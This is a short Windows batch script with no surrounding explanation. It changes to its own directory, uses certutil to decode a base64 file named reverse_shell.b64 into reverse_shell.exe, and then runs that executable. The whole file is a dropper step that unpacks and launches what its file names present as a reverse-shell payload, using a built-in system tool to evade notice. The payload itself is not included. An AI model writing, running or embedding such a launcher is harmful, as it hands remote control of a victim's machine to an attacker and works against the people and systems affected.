@echo off
:: Change directory to the current script location
cd /d "%~dp0"

:: Decode base64 to exe (using certutil)
certutil -decode reverse_shell.b64 reverse_shell.exe

:: Execute the file
reverse_shell.exe
